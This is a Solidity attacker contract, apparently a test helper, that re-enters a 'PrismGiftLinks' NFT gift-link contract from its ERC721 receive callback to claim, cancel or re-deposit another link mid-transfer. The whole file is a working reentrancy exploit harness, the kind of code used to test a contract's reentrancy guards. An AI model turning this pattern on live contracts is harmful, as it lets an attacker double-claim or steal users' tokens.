// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IGiftLinks {
    function claim(uint256 linkId, address recipient) external;
    function cancel(uint256 linkId) external;
}

interface IForge {
    function forge(address[] calldata tokens, uint256[] calldata amounts) external payable returns (uint256);
}

/// Acts as a claim key or a sender, and re-enters PrismGiftLinks when a crystal arrives.
contract GiftLinkAttacker is IERC721Receiver {
    IGiftLinks public immutable links;
    IERC721 public immutable crystal;
    /// 0 = off, 1 = claim another link, 2 = cancel another link, 3 = deposit another crystal as a new link
    uint8 public mode;
    uint256 public target;
    bytes public depositData;

    constructor(address links_, address crystal_) {
        links = IGiftLinks(links_);
        crystal = IERC721(crystal_);
    }

    function forgeEth() external payable returns (uint256) {
        return IForge(address(crystal)).forge{value: msg.value}(new address[](0), new uint256[](0));
    }

    function arm(uint8 mode_, uint256 target_, bytes calldata data) external {
        mode = mode_;
        target = target_;
        depositData = data;
    }

    function deposit(uint256 crystalId, bytes calldata data) external {
        crystal.safeTransferFrom(address(this), address(links), crystalId, data);
    }

    function claim(uint256 linkId) external {
        links.claim(linkId, address(this));
    }

    function cancel(uint256 linkId) external {
        links.cancel(linkId);
    }

    function onERC721Received(address, address from, uint256, bytes calldata) external returns (bytes4) {
        // only crystals coming back from the links contract (not mints) trigger the attack
        if (msg.sender == address(crystal) && from == address(links) && mode != 0) {
            uint8 m = mode;
            mode = 0;
            if (m == 1) links.claim(target, address(this));
            else if (m == 2) links.cancel(target);
            else if (m == 3) crystal.safeTransferFrom(address(this), address(links), target, depositData);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
